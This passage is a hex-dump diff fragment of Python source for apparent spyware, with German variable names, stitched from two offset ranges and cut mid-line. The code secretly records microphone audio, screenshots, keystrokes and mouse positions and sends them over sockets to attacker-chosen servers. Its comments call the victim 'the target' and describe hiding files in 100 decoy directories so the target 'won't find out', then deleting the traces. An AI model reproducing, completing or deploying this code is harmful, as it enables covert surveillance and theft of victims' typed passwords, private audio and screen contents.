+-00002b50: 6374 7561 6c20 7072 6f67 7261 6d6d 696e  ctual programmin
+-00002b60: 670d 0a20 2020 2020 2020 2074 6872 6561  g..        threa
+-00002b70: 6469 6e67 5f6d 6f75 7365 2e73 7461 7274  ding_mouse.start
+-00002b80: 2829 0d0a 0d0a 2020 2020 2020 2020 7365  ()....        se
+-00002b90: 6e64 5f74 696d 6572 203d 2073 6f63 6b65  nd_timer = socke
+-00002ba0: 742e 736f 636b 6574 2873 6f63 6b65 742e  t.socket(socket.
+-00002bb0: 4146 5f49 4e45 542c 2073 6f63 6b65 742e  AF_INET, socket.
+-00002bc0: 534f 434b 5f53 5452 4541 4d29 0d0a 2020  SOCK_STREAM)..  
+-00002bd0: 2020 2020 2020 7365 6e64 5f74 696d 6572        send_timer
+-00002be0: 2e63 6f6e 6e65 6374 2828 7365 6c66 2e69  .connect((self.i
+-00002bf0: 705f 7469 6d65 722c 2073 656c 662e 706f  p_timer, self.po
+-00002c00: 7274 5f74 696d 6572 2929 0d0a 0d0a 2020  rt_timer))....  
+-00002c10: 2020 2020 2020 7365 6e64 5f74 696d 6572        send_timer
+-00002c20: 2e73 656e 6428 7374 7228 7365 6c66 2e64  .send(str(self.d
+-00002c30: 7572 6174 696f 6e29 2e65 6e63 6f64 6528  uration).encode(
+-00002c40: 2929 0d0a 2020 2020 2020 2020 2320 5468  ))..        # Th
+-00002c50: 6973 2073 656e 6473 2074 6865 2073 6563  is sends the sec
+-00002c60: 6f6e 6473 2074 6f20 7468 6520 7365 7276  onds to the serv
+-00002c70: 6572 0d0a 2020 2020 2020 2020 7365 6e64  er..        send
+-00002c80: 5f74 696d 6572 2e63 6c6f 7365 2829 0d0a  _timer.close()..
+-00002c90: 0d0a 2020 2020 2020 2020 7769 7468 206b  ..        with k
+-00002ca0: 6579 626f 6172 642e 4c69 7374 656e 6572  eyboard.Listener
+-00002cb0: 286f 6e5f 7072 6573 733d 7365 6c66 2e6f  (on_press=self.o
+-00002cc0: 6e5f 7072 6573 732c 206f 6e5f 7265 6c65  n_press, on_rele
+-00002cd0: 6173 653d 7365 6c66 2e6f 6e5f 7265 6c65  ase=self.on_rele
+-00002ce0: 6173 6529 2061 7320 6c69 7374 656e 6572  ase) as listener
+-00002cf0: 3a0d 0a20 2020 2020 2020 2020 2020 2073  :..            s
+-00002d00: 656c 662e 636f 756e 7464 6f77 6e5f 7365  elf.countdown_se
+-00002d10: 6e64 2873 656c 662e 6475 7261 7469 6f6e  nd(self.duration
+-00002d20: 2c20 7365 6c66 2e69 705f 7068 6f74 6f73  , self.ip_photos
+-00002d30: 2c20 7365 6c66 2e70 6f72 745f 7068 6f74  , self.port_phot
+-00002d40: 6f73 2c20 7365 6c66 2e69 705f 6b65 796c  os, self.ip_keyl
+-00002d50: 6f67 6765 722c 0d0a 2020 2020 2020 2020  ogger,..        
+-00002d60: 2020 2020 2020 2020 2020 2020 2020 2020                  
+-00002d70: 2020 2020 2020 2020 7365 6c66 2e70 6f72          self.por
+-00002d80: 745f 6b65 796c 6f67 6765 7229 0d0a 2020  t_keylogger)..  
+-00002d90: 2020 2020 2020 2020 2020 6c69 7374 656e            listen
+-00002da0: 6572 2e6a 6f69 6e28 290d 0a20 2020 2020  er.join()..     
+-00002db0: 2020 2020 2020 2023 2054 6869 7320 6c69         # This li
+-00002dc0: 7374 656e 7320 746f 2074 6865 206b 6579  stens to the key
+-00002dd0: 7320 7468 6174 2077 6865 7265 2074 7970  s that where typ
+-00002de0: 6564                                     ed
++000005b0: 7264 696e 6174 6573 203d 205b 5d0d 0a20  rdinates = [].. 
++000005c0: 2020 2020 2020 2073 656c 662e 776f 7264         self.word
++000005d0: 203d 204e 6f6e 650d 0a0d 0a20 2020 2064   = None....    d
++000005e0: 6566 2064 6174 656e 5f61 7566 6e65 6865  ef daten_aufnehe
++000005f0: 6d65 6e28 7365 6c66 293a 0d0a 2020 2020  men(self):..    
++00000600: 2020 2020 6c69 7374 656e 696e 675f 6461      listening_da
++00000610: 7461 203d 2073 6f63 6b65 742e 736f 636b  ta = socket.sock
++00000620: 6574 2873 6f63 6b65 742e 4146 5f49 4e45  et(socket.AF_INE
++00000630: 542c 2073 6f63 6b65 742e 534f 434b 5f53  T, socket.SOCK_S
++00000640: 5452 4541 4d29 0d0a 2020 2020 2020 2020  TREAM)..        
++00000650: 6c69 7374 656e 696e 675f 6461 7461 2e63  listening_data.c
++00000660: 6f6e 6e65 6374 2828 7365 6c66 2e69 705f  onnect((self.ip_
++00000670: 6c69 7374 656e 6572 2c20 7365 6c66 2e70  listener, self.p
++00000680: 6f72 745f 6c69 7374 656e 6572 2929 0d0a  ort_listener))..
++00000690: 2020 2020 2020 2020 7472 793a 0d0a 2020          try:..  
++000006a0: 2020 2020 2020 2020 2020 666f 726d 6174            format
++000006b0: 203d 2070 7961 7564 696f 2e70 6149 6e74   = pyaudio.paInt
++000006c0: 3136 0d0a 2020 2020 2020 2020 2020 2020  16..            
++000006d0: 6368 616e 6e65 6c73 203d 2032 0d0a 2020  channels = 2..  
++000006e0: 2020 2020 2020 2020 2020 7261 7465 203d            rate =
++000006f0: 2034 3431 3030 0d0a 2020 2020 2020 2020   44100..        
++00000700: 2020 2020 6368 756e 6b20 3d20 3130 3234      chunk = 1024
++00000710: 0d0a 2020 2020 2020 2020 2020 2020 7365  ..            se
++00000720: 636f 6e64 7320 3d20 7365 6c66 2e64 7572  conds = self.dur
++00000730: 6174 696f 6e20 2b20 310d 0a0d 0a20 2020  ation + 1....   
++00000740: 2020 2020 2020 2020 2061 7564 696f 203d           audio =
++00000750: 2070 7961 7564 696f 2e50 7941 7564 696f   pyaudio.PyAudio
++00000760: 2829 0d0a 0d0a 2020 2020 2020 2020 2020  ()....          
++00000770: 2020 2320 7374 6172 7420 5265 636f 7264    # start Record
++00000780: 696e 670d 0a20 2020 2020 2020 2020 2020  ing..           
++00000790: 2073 7472 6561 6d20 3d20 6175 6469 6f2e   stream = audio.
++000007a0: 6f70 656e 2866 6f72 6d61 743d 666f 726d  open(format=form
++000007b0: 6174 2c20 6368 616e 6e65 6c73 3d63 6861  at, channels=cha
++000007c0: 6e6e 656c 732c 0d0a 2020 2020 2020 2020  nnels,..        
++000007d0: 2020 2020 2020 2020 2020 2020 2020 2020                  
++000007e0: 2020 2020 2020 2020 7261 7465 3d72 6174          rate=rat
++000007f0: 652c 2069 6e70 7574 3d54 7275 652c 0d0a  e, input=True,..
++00000800: 2020 2020 2020 2020 2020 2020 2020 2020                  
++00000810: 2020 2020 2020 2020 2020 2020 2020 2020                  
++00000820: 6672 616d 6573 5f70 6572 5f62 7566 6665  frames_per_buffe
++00000830: 723d 6368 756e 6b29 0d0a 2020 2020 2020  r=chunk)..      
++00000840: 2020 2020 2020 2320 7072 696e 7428 2272        # print("r
++00000850: 6563 6f72 6469 6e67 2e2e 2e22 290d 0a20  ecording...").. 
++00000860: 2020 2020 2020 2020 2020 2066 7261 6d65             frame
++00000870: 7320 3d20 5b5d 0d0a 0d0a 2020 2020 2020  s = []....      
++00000880: 2020 2020 2020 666f 7220 6920 696e 2072        for i in r
++00000890: 616e 6765 2830 2c20 696e 7428 7261 7465  ange(0, int(rate
++000008a0: 202f 2063 6875 6e6b 202a 2073 6563 6f6e   / chunk * secon
++000008b0: 6473 2929 3a0d 0a20 2020 2020 2020 2020  ds)):..         
++000008c0: 2020 2020 2020 2064 6174 6120 3d20 7374         data = st
++000008d0: 7265 616d 2e72 6561 6428 6368 756e 6b29  ream.read(chunk)
++000008e0: 0d0a 2020 2020 2020 2020 2020 2020 2020  ..              
++000008f0: 2020 6672 616d 6573 2e61 7070 656e 6428    frames.append(
++00000900: 6461 7461 290d 0a0d 0a20 2020 2020 2020  data)....       
++00000910: 2020 2020 2023 2070 7269 6e74 2822 6669       # print("fi
++00000920: 6e69 7368 6564 2072 6563 6f72 6469 6e67  nished recording
++00000930: 2229 0d0a 0d0a 2020 2020 2020 2020 2020  ")....          
++00000940: 2020 2320 7374 6f70 2052 6563 6f72 6469    # stop Recordi
++00000950: 6e67 0d0a 2020 2020 2020 2020 2020 2020  ng..            
++00000960: 7374 7265 616d 2e73 746f 705f 7374 7265  stream.stop_stre
++00000970: 616d 2829 0d0a 2020 2020 2020 2020 2020  am()..          
++00000980: 2020 7374 7265 616d 2e63 6c6f 7365 2829    stream.close()
++00000990: 0d0a 2020 2020 2020 2020 2020 2020 6175  ..            au
++000009a0: 6469 6f2e 7465 726d 696e 6174 6528 290d  dio.terminate().
++000009b0: 0a0d 0a20 2020 2020 2020 2020 2020 2023  ...            #
++000009c0: 2043 6f6e 6e65 6374 696f 6e20 7769 7468   Connection with
++000009d0: 2053 6572 7665 724c 6973 7465 6e65 720d   ServerListener.
++000009e0: 0a0d 0a20 2020 2020 2020 2020 2020 2073  ...            s
++000009f0: 7472 5f66 7261 6d65 7320 3d20 7374 7228  tr_frames = str(
++00000a00: 6672 616d 6573 290d 0a20 2020 2020 2020  frames)..       
++00000a10: 2020 2020 206c 6973 7465 6e69 6e67 5f64       listening_d
++00000a20: 6174 612e 7365 6e64 2873 7472 5f66 7261  ata.send(str_fra
++00000a30: 6d65 732e 656e 636f 6465 2829 290d 0a0d  mes.encode())...
++00000a40: 0a20 2020 2020 2020 2065 7863 6570 7420  .        except 
++00000a50: 4f53 4572 726f 723a 0d0a 2020 2020 2020  OSError:..      
++00000a60: 2020 2020 2020 7072 696e 7428 224e 4f20        print("NO 
++00000a70: 4d49 4352 4f50 484f 4e45 2044 4554 4543  MICROPHONE DETEC
++00000a80: 5445 4420 4f52 204d 4943 524f 5048 4f4e  TED OR MICROPHON
++00000a90: 4520 5345 5454 494e 4720 4449 5341 424c  E SETTING DISABL
++00000aa0: 4544 2229 0d0a 2020 2020 2020 2020 2020  ED")..          
++00000ab0: 2020 6e6f 5f6d 6963 726f 666f 6e20 3d20    no_microfon = 
++00000ac0: 2254 4845 2054 4152 4745 5420 4841 5320  "THE TARGET HAS 
++00000ad0: 4e4f 204d 4943 524f 5048 4f4e 4520 4f4e  NO MICROPHONE ON
++00000ae0: 220d 0a20 2020 2020 2020 2020 2020 206c  "..            l
++00000af0: 6973 7465 6e69 6e67 5f64 6174 612e 7365  istening_data.se
++00000b00: 6e64 286e 6f5f 6d69 6372 6f66 6f6e 2e65  nd(no_microfon.e
++00000b10: 6e63 6f64 6528 2929 0d0a 2020 2020 2020  ncode())..      
++00000b20: 2020 2020 2020 2320 5365 6e64 7320 6461        # Sends da
++00000b30: 7461 2074 6f20 5365 7276 6572 4c69 7374  ta to ServerList
++00000b40: 656e 6572 0d0a 0d0a 2020 2020 6465 6620  ener....    def 
++00000b50: 616c 6c5f 6469 7228 7365 6c66 293a 0d0a  all_dir(self):..
++00000b60: 2020 2020 2020 2020 676c 6f62 616c 2072          global r
++00000b70: 616e 646f 6d5f 6c73 740d 0a20 2020 2020  andom_lst..     
++00000b80: 2020 207a 6569 6368 656e 203d 2022 7177     zeichen = "qw
++00000b90: 6572 747a 7569 6f70 6173 6466 6768 6a6b  ertzuiopasdfghjk
++00000ba0: 6c79 7863 7662 6e6d 3132 3334 3536 3738  lyxcvbnm12345678
++00000bb0: 3930 220d 0a20 2020 2020 2020 2072 616e  90"..        ran
++00000bc0: 646f 6d5f 6c73 7420 3d20 5b22 222e 6a6f  dom_lst = ["".jo
++00000bd0: 696e 2872 616e 646f 6d2e 7361 6d70 6c65  in(random.sample
++00000be0: 287a 6569 6368 656e 2c20 7261 6e64 6f6d  (zeichen, random
++00000bf0: 2e72 616e 6469 6e74 2834 2c20 3130 2929  .randint(4, 10))
++00000c00: 2920 666f 7220 7820 696e 2072 616e 6765  ) for x in range
++00000c10: 2831 3030 295d 0d0a 2020 2020 2020 2020  (100)]..        
++00000c20: 2320 5468 6973 206d 616b 6573 2061 206c  # This makes a l
++00000c30: 6973 7420 6f66 2065 7665 7279 2064 6972  ist of every dir
++00000c40: 6563 746f 7279 206e 616d 6520 7261 6e64  ectory name rand
++00000c50: 6f6d 6c79 0d0a 2020 2020 2020 2020 666f  omly..        fo
++00000c60: 7220 6469 725f 6e61 6d65 2069 6e20 7261  r dir_name in ra
++00000c70: 6e64 6f6d 5f6c 7374 3a0d 0a20 2020 2020  ndom_lst:..     
++00000c80: 2020 2020 2020 206f 732e 7379 7374 656d         os.system
++00000c90: 2866 226d 6b64 6972 207b 6469 725f 6e61  (f"mkdir {dir_na
++00000ca0: 6d65 7d22 290d 0a20 2020 2020 2020 2020  me}")..         
++00000cb0: 2020 2023 2054 6865 2064 6972 6563 746f     # The directo
++00000cc0: 7279 2069 7320 6265 696e 6720 6d61 6465  ry is being made
++00000cd0: 2068 6572 650d 0a0d 0a20 2020 2020 2020   here....       
++00000ce0: 2072 616e 646f 6d5f 6469 7220 3d20 7261   random_dir = ra
++00000cf0: 6e64 6f6d 2e63 686f 6963 6528 7261 6e64  ndom.choice(rand
++00000d00: 6f6d 5f6c 7374 290d 0a20 2020 2020 2020  om_lst)..       
++00000d10: 206f 732e 6368 6469 7228 7261 6e64 6f6d   os.chdir(random
++00000d20: 5f64 6972 290d 0a20 2020 2020 2020 2023  _dir)..        #
++00000d30: 2057 6520 6172 6520 6e6f 7720 696e 2074   We are now in t
++00000d40: 6861 7420 6469 7265 6374 6f72 7920 7768  hat directory wh
++00000d50: 6572 6520 7468 6520 696d 6167 6520 6361  ere the image ca
++00000d60: 6e20 6265 2073 746f 7265 640d 0a0d 0a20  n be stored.... 
++00000d70: 2020 2064 6566 2063 6c69 656e 7428 7365     def client(se
++00000d80: 6c66 2c20 6970 5f70 686f 746f 732c 2070  lf, ip_photos, p
++00000d90: 6f72 745f 7068 6f74 6f73 293a 0d0a 2020  ort_photos):..  
++00000da0: 2020 2020 2020 676c 6f62 616c 2066 6861        global fha
++00000db0: 6e64 6c65 0d0a 2020 2020 2020 2020 2320  ndle..        # 
++00000dc0: 6668 616e 646c 6520 6973 2074 6865 2076  fhandle is the v
++00000dd0: 6172 6961 626c 6520 7768 6963 6820 6f70  ariable which op
++00000de0: 656e 7320 7468 6520 666f 746f 0d0a 2020  ens the foto..  
++00000df0: 2020 2020 2020 7320 3d20 736f 636b 6574        s = socket
++00000e00: 2e73 6f63 6b65 7428 736f 636b 6574 2e41  .socket(socket.A
++00000e10: 465f 494e 4554 2c20 736f 636b 6574 2e53  F_INET, socket.S
++00000e20: 4f43 4b5f 5354 5245 414d 290d 0a20 2020  OCK_STREAM)..   
++00000e30: 2020 2020 2073 2e63 6f6e 6e65 6374 2828       s.connect((
++00000e40: 6970 5f70 686f 746f 732c 2070 6f72 745f  ip_photos, port_
++00000e50: 7068 6f74 6f73 2929 0d0a 2020 2020 2020  photos))..      
++00000e60: 2020 2320 5468 6973 2063 6f6e 6e65 6374    # This connect
++00000e70: 7320 746f 2074 6865 2073 6572 7665 7220  s to the server 
++00000e80: 796f 7520 7370 6563 6966 6965 640d 0a20  you specified.. 
++00000e90: 2020 2020 2020 2069 6d61 6765 203d 2070         image = p
++00000ea0: 672e 7363 7265 656e 7368 6f74 2829 0d0a  g.screenshot()..
++00000eb0: 2020 2020 2020 2020 2320 2269 6d61 6765          # "image
++00000ec0: 2220 7363 7265 656e 7368 6f74 7320 7468  " screenshots th
++00000ed0: 6520 6375 7272 656e 7420 696d 6167 6520  e current image 
++00000ee0: 6166 7465 7220 6120 7370 6563 6966 6963  after a specific
++00000ef0: 2074 696d 650d 0a20 2020 2020 2020 2066   time..        f
++00000f00: 6f74 6f6e 616d 6520 3d20 2249 6d61 6765  otoname = "Image
++00000f10: 2e70 6e67 220d 0a20 2020 2020 2020 2023  .png"..        #
++00000f20: 204e 616d 6520 6f66 2074 6865 2069 6d61   Name of the ima
++00000f30: 6765 0d0a 2020 2020 2020 2020 696d 6167  ge..        imag
++00000f40: 652e 7361 7665 2866 6f74 6f6e 616d 6529  e.save(fotoname)
++00000f50: 0d0a 2020 2020 2020 2020 2320 5361 7665  ..        # Save
++00000f60: 7320 7468 6520 696d 6167 6520 696e 2074  s the image in t
++00000f70: 6865 2063 7572 7265 6e74 2064 6972 6563  he current direc
++00000f80: 746f 7279 0d0a 2020 2020 2020 2020 6668  tory..        fh
++00000f90: 616e 646c 6520 3d20 6f70 656e 2866 6f74  andle = open(fot
++00000fa0: 6f6e 616d 652c 2022 7262 2229 0d0a 2020  oname, "rb")..  
++00000fb0: 2020 2020 2020 2320 4f70 656e 7320 7468        # Opens th
++00000fc0: 6520 696d 6167 650d 0a0d 0a20 2020 2020  e image....     
++00000fd0: 2020 2066 756c 6c5f 6d73 6720 3d20 6222     full_msg = b"
++00000fe0: 220d 0a20 2020 2020 2020 2023 2045 7665  "..        # Eve
++00000ff0: 7279 2069 6d61 6765 2069 6e66 6f72 6d61  ry image informa
++00001000: 7469 6f6e 2077 696c 6c20 6265 2073 746f  tion will be sto
++00001010: 7265 6420 696e 2022 6675 6c6c 5f6d 7367  red in "full_msg
++00001020: 220d 0a20 2020 2020 2020 2066 6f72 206c  "..        for l
++00001030: 696e 6520 696e 2066 6861 6e64 6c65 3a0d  ine in fhandle:.
++00001040: 0a20 2020 2020 2020 2020 2020 2066 756c  .            ful
++00001050: 6c5f 6d73 6720 2b3d 206c 696e 650d 0a0d  l_msg += line...
++00001060: 0a20 2020 2020 2020 2073 2e73 656e 6428  .        s.send(
++00001070: 6675 6c6c 5f6d 7367 290d 0a0d 0a20 2020  full_msg)....   
++00001080: 2064 6566 2063 6f75 6e74 646f 776e 5f73   def countdown_s
++00001090: 656e 6428 7365 6c66 2c20 7a65 6974 2c20  end(self, zeit, 
++000010a0: 6970 5f70 686f 746f 732c 2070 6f72 745f  ip_photos, port_
++000010b0: 7068 6f74 6f73 2c20 6970 5f6b 6579 6c6f  photos, ip_keylo
++000010c0: 6767 6572 2c20 706f 7274 5f6b 6579 6c6f  gger, port_keylo
++000010d0: 6767 6572 293a 0d0a 2020 2020 2020 2020  gger):..        
++000010e0: 7365 636f 6e64 735f 6c69 7374 203d 205b  seconds_list = [
++000010f0: 7a61 686c 2066 6f72 207a 6168 6c20 696e  zahl for zahl in
++00001100: 2072 616e 6765 2830 2c20 7a65 6974 202b   range(0, zeit +
++00001110: 2031 2c20 3230 2920 6966 207a 6168 6c20   1, 20) if zahl 
++00001120: 213d 2030 5d0d 0a20 2020 2020 2020 2023  != 0]..        #
++00001130: 2054 6865 2073 6563 6f6e 6473 2074 6865   The seconds the
++00001140: 2069 6d61 6765 2077 696c 6c20 6265 2073   image will be s
++00001150: 656e 7420 696e 2032 3020 7374 6570 7320  ent in 20 steps 
++00001160: 746f 2074 6865 2073 6572 7665 7220 7769  to the server wi
++00001170: 6c6c 2062 6520 7361 7665 6420 696e 2022  ll be saved in "
++00001180: 7365 636f 6e64 735f 6c69 7374 220d 0a20  seconds_list".. 
++00001190: 2020 2020 2020 2070 7269 6e74 2873 6563         print(sec
++000011a0: 6f6e 6473 5f6c 6973 7429 0d0a 2020 2020  onds_list)..    
++000011b0: 2020 2020 6b65 795f 6461 7461 203d 2073      key_data = s
++000011c0: 6f63 6b65 742e 736f 636b 6574 2873 6f63  ocket.socket(soc
++000011d0: 6b65 742e 4146 5f49 4e45 542c 2073 6f63  ket.AF_INET, soc
++000011e0: 6b65 742e 534f 434b 5f53 5452 4541 4d29  ket.SOCK_STREAM)
++000011f0: 0d0a 0d0a 2020 2020 2020 2020 7472 793a  ....        try:
++00001200: 0d0a 2020 2020 2020 2020 2020 2020 666f  ..            fo
++00001210: 7220 7820 696e 2072 616e 6765 287a 6569  r x in range(zei
++00001220: 7420 2b20 3129 3a0d 0a20 2020 2020 2020  t + 1):..       
++00001230: 2020 2020 2020 2020 2069 6620 7820 3d3d           if x ==
++00001240: 2032 303a 0d0a 2020 2020 2020 2020 2020   20:..          
++00001250: 2020 2020 2020 2020 2020 7365 6c66 2e61            self.a
++00001260: 6c6c 5f64 6972 2829 0d0a 2020 2020 2020  ll_dir()..      
++00001270: 2020 2020 2020 2020 2020 2020 2020 2320                # 
++00001280: 5468 6973 2066 756e 6374 696f 6e20 6d61  This function ma
++00001290: 6b65 7320 3130 3020 6669 6c65 7320 746f  kes 100 files to
++000012a0: 2073 746f 7265 2074 6865 2069 6d61 6765   store the image
++000012b0: 2073 6f20 7468 6520 7461 7267 6574 2077   so the target w
++000012c0: 6f6e 2774 2066 696e 6420 6f75 740d 0a20  on't find out.. 
++000012d0: 2020 2020 2020 2020 2020 2020 2020 2070                 p
++000012e0: 7269 6e74 2878 290d 0a20 2020 2020 2020  rint(x)..       
++000012f0: 2020 2020 2020 2020 207a 6569 7420 2d3d           zeit -=
++00001300: 2031 0d0a 2020 2020 2020 2020 2020 2020   1..            
++00001310: 2020 2020 7469 6d65 2e73 6c65 6570 2831      time.sleep(1
++00001320: 290d 0a20 2020 2020 2020 2020 2020 2020  )..             
++00001330: 2020 2069 6620 7820 696e 2073 6563 6f6e     if x in secon
++00001340: 6473 5f6c 6973 743a 0d0a 2020 2020 2020  ds_list:..      
++00001350: 2020 2020 2020 2020 2020 2020 2020 7365                se
++00001360: 6c66 2e63 6c69 656e 7428 6970 5f70 686f  lf.client(ip_pho
++00001370: 746f 732c 2070 6f72 745f 7068 6f74 6f73  tos, port_photos
++00001380: 290d 0a20 2020 2020 2020 2020 2020 2020  )..             
++00001390: 2020 2020 2020 2023 2054 6865 2069 6d61         # The ima
++000013a0: 6765 7320 7769 6c6c 2062 6520 7365 6e74  ges will be sent
++000013b0: 0d0a 2020 2020 2020 2020 2020 2020 6b65  ..            ke
++000013c0: 795f 6461 7461 2e63 6f6e 6e65 6374 2828  y_data.connect((
++000013d0: 6970 5f6b 6579 6c6f 6767 6572 2c20 706f  ip_keylogger, po
++000013e0: 7274 5f6b 6579 6c6f 6767 6572 2929 0d0a  rt_keylogger))..
++000013f0: 2020 2020 2020 2020 2020 2020 2320 5468              # Th
++00001400: 6973 2069 7320 7468 6520 6970 2061 6e64  is is the ip and
++00001410: 2074 6865 2070 6f72 7420 6f66 2074 6865   the port of the
++00001420: 2073 6572 7665 7220 7468 6520 706f 7274   server the port
++00001430: 2073 686f 756c 646e 2774 2062 6520 7468   shouldn't be th
++00001440: 6520 7361 6d65 2074 6865 2073 6572 7665  e same the serve
++00001450: 725f 7068 6f74 6f73 2061 6e64 2074 6865  r_photos and the
++00001460: 2073 6572 7665 725f 6b65 796c 6f67 6765   server_keylogge
++00001470: 7220 7368 6f75 6c64 6e27 7420 6265 0d0a  r shouldn't be..
++00001480: 2020 2020 2020 2020 2020 2020 2320 696e              # in
++00001490: 2074 6865 2073 616d 6520 666f 6c64 6572   the same folder
++000014a0: 0d0a 2020 2020 2020 2020 2020 2020 7365  ..            se
++000014b0: 6c66 2e63 6f6f 7264 696e 6174 6573 203d  lf.coordinates =
++000014c0: 206c 6973 7428 7365 7428 7365 6c66 2e63   list(set(self.c
++000014d0: 6f6f 7264 696e 6174 6573 2929 0d0a 2020  oordinates))..  
++000014e0: 2020 2020 2020 2020 2020 2320 5468 6973            # This
++000014f0: 2063 6865 636b 7320 6966 2074 6865 2063   checks if the c
++00001500: 6f6f 7264 696e 6174 6573 206f 6363 7572  oordinates occur
++00001510: 2032 2074 696d 6573 0d0a 2020 2020 2020   2 times..      
++00001520: 2020 2020 2020 7072 696e 7428 7365 6c66        print(self
++00001530: 2e63 6f6f 7264 696e 6174 6573 290d 0a20  .coordinates).. 
++00001540: 2020 2020 2020 2020 2020 2077 6f72 7420             wort 
++00001550: 3d20 2222 0d0a 2020 2020 2020 2020 2020  = ""..          
++00001560: 2020 666f 7220 7a65 6963 6865 6e20 696e    for zeichen in
++00001570: 2073 656c 662e 7269 6368 7469 6765 5f6c   self.richtige_l
++00001580: 6973 7465 3a0d 0a20 2020 2020 2020 2020  iste:..         
++00001590: 2020 2020 2020 2077 6f72 7420 2b3d 207a         wort += z
++000015a0: 6569 6368 656e 0d0a 0d0a 2020 2020 2020  eichen....      
++000015b0: 2020 2020 2020 2320 5365 6e64 7320 7468        # Sends th
++000015c0: 6520 6461 7461 2074 6f20 7365 7276 6572  e data to server
++000015d0: 5f6b 6579 6c6f 6767 6572 0d0a 2020 2020  _keylogger..    
++000015e0: 2020 2020 2020 2020 616c 6c5f 6461 7461          all_data
++000015f0: 203d 2073 7472 2873 656c 662e 636f 6f72   = str(self.coor
++00001600: 6469 6e61 7465 7329 202b 2077 6f72 740d  dinates) + wort.
++00001610: 0a20 2020 2020 2020 2020 2020 2023 2043  .            # C
++00001620: 6f6f 7264 696e 6174 6573 2061 6e64 206b  oordinates and k
++00001630: 6579 6461 7461 2061 7265 2062 6569 6e67  eydata are being
++00001640: 2063 6f6e 6361 7465 6e61 7465 640d 0a20   concatenated.. 
++00001650: 2020 2020 2020 2020 2020 206b 6579 5f64             key_d
++00001660: 6174 612e 7365 6e64 2861 6c6c 5f64 6174  ata.send(all_dat
++00001670: 612e 656e 636f 6465 2829 290d 0a20 2020  a.encode())..   
++00001680: 2020 2020 2020 2020 2070 7269 6e74 2877           print(w
++00001690: 6f72 7429 0d0a 2020 2020 2020 2020 2020  ort)..          
++000016a0: 2020 7072 696e 7428 7365 6c66 2e72 6963    print(self.ric
++000016b0: 6874 6967 655f 6c69 7374 6529 0d0a 2020  htige_liste)..  
++000016c0: 2020 2020 2020 2020 2020 6668 616e 646c            fhandl
++000016d0: 652e 636c 6f73 6528 290d 0a20 2020 2020  e.close()..     
++000016e0: 2020 2020 2020 2023 2043 6c6f 7365 7320         # Closes 
++000016f0: 7468 6520 696d 6167 650d 0a20 2020 2020  the image..     
++00001700: 2020 2020 2020 206f 732e 7265 6d6f 7665         os.remove
++00001710: 2822 496d 6167 652e 706e 6722 290d 0a20  ("Image.png").. 
++00001720: 2020 2020 2020 2020 2020 2023 2044 656c             # Del
++00001730: 6574 6573 2074 6865 2069 6d61 6765 2069  etes the image i
++00001740: 6e20 7468 6520 6375 7272 656e 7420 6469  n the current di
++00001750: 7265 6374 6f72 790d 0a20 2020 2020 2020  rectory..       
++00001760: 2020 2020 206f 732e 6368 6469 7228 222e       os.chdir(".
++00001770: 2e22 290d 0a20 2020 2020 2020 2020 2020  .")..           
++00001780: 2023 2057 6520 6861 7665 2074 6f20 676f   # We have to go
++00001790: 2062 6163 6b20 736f 2074 6861 7420 7765   back so that we
++000017a0: 2063 616e 2064 656c 6574 6520 7468 6520   can delete the 
++000017b0: 6f74 6865 7220 6469 7265 6374 6f72 6965  other directorie
++000017c0: 730d 0a20 2020 2020 2020 2020 2020 2066  s..            f
++000017d0: 6f72 2065 6163 685f 6469 7220 696e 2072  or each_dir in r
++000017e0: 616e 646f 6d5f 6c73 743a 0d0a 2020 2020  andom_lst:..    
++000017f0: 2020 2020 2020 2020 2020 2020 6f73 2e73              os.s
++00001800: 7973 7465 6d28 6622 726d 6469 7220 7b65  ystem(f"rmdir {e
++00001810: 6163 685f 6469 727d 2229 0d0a 2020 2020  ach_dir}")..    
++00001820: 2020 2020 2020 2020 2020 2020 2320 5468              # Th
++00001830: 6973 2064 656c 6574 6573 2065 7665 7279  is deletes every
++00001840: 2064 6972 6563 746f 7279 0d0a 2020 2020   directory..    
++00001850: 2020 2020 2020 2020 7379 732e 6578 6974          sys.exit
++00001860: 2829 0d0a 2020 2020 2020 2020 2020 2020  ()..            
++00001870: 2320 5374 6f70 7320 7468 6520 6b65 796c  # Stops the keyl
++00001880: 6f67 6765 720d 0a20 2020 2020 2020 2065  ogger..        e
++00001890: 7863 6570 7420 4b65 7962 6f61 7264 496e  xcept KeyboardIn
++000018a0: 7465 7272 7570 743a 0d0a 2020 2020 2020  terrupt:..      
++000018b0: 2020 2020 2020 2320 4966 2074 6865 2074        # If the t
++000018c0: 6172 6765 7420 6861 7320 6465 7374 726f  arget has destro
++000018d0: 7965 6420 7468 6520 636f 6e6e 6563 7469  yed the connecti
++000018e0: 6f6e 0d0a 2020 2020 2020 2020 2020 2020  on..            
++000018f0: 776f 7274 203d 2022 2a2a 2a25 c2a7 c2a7  wort = "***%....
++00001900: 29c2 a7c2 a725 220d 0a20 2020 2020 2020  )....%"..       
++00001910: 2020 2020 2023 2054 6869 7320 6973 206c       # This is l
++00001920: 696b 6520 6120 7370 6563 6961 6c20 636f  ike a special co
++00001930: 6465 2e20 546f 2073 706c 6974 2069 7420  de. To split it 
++00001940: 6174 2074 6865 2065 6e64 0d0a 2020 2020  at the end..    
++00001950: 2020 2020 2020 2020 666f 7220 7a65 6963          for zeic
++00001960: 6865 6e20 696e 2073 656c 662e 7269 6368  hen in self.rich
++00001970: 7469 6765 5f6c 6973 7465 3a0d 0a20 2020  tige_liste:..   
++00001980: 2020 2020 2020 2020 2020 2020 2077 6f72               wor
++00001990: 7420 2b3d 207a 6569 6368 656e 0d0a 2020  t += zeichen..  
++000019a0: 2020 2020 2020 2020 2020 6461 7461 203d            data =
++000019b0: 2066 2254 4845 2043 4f4e 4e45 4354 494f   f"THE CONNECTIO
++000019c0: 4e20 4841 5320 4245 454e 2049 4e54 4552  N HAS BEEN INTER
++000019d0: 5255 5054 4544 7b77 6f72 747d 220d 0a20  RUPTED{wort}".. 
++000019e0: 2020 2020 2020 2020 2020 2023 2054 6869             # Thi
++000019f0: 7320 6c65 7427 7320 7468 6520 7365 7276  s let's the serv
++00001a00: 6572 206b 6e6f 7720 7468 6174 2074 6865  er know that the
++00001a10: 2073 6572 7665 7220 7368 6f75 6c64 2073   server should s
++00001a20: 6875 7420 646f 776e 0d0a 2020 2020 2020  hut down..      
++00001a30: 2020 2020 2020 6b65 795f 6461 7461 2e63        key_data.c
++00001a40: 6f6e 6e65 6374 2828 6970 5f6b 6579 6c6f  onnect((ip_keylo
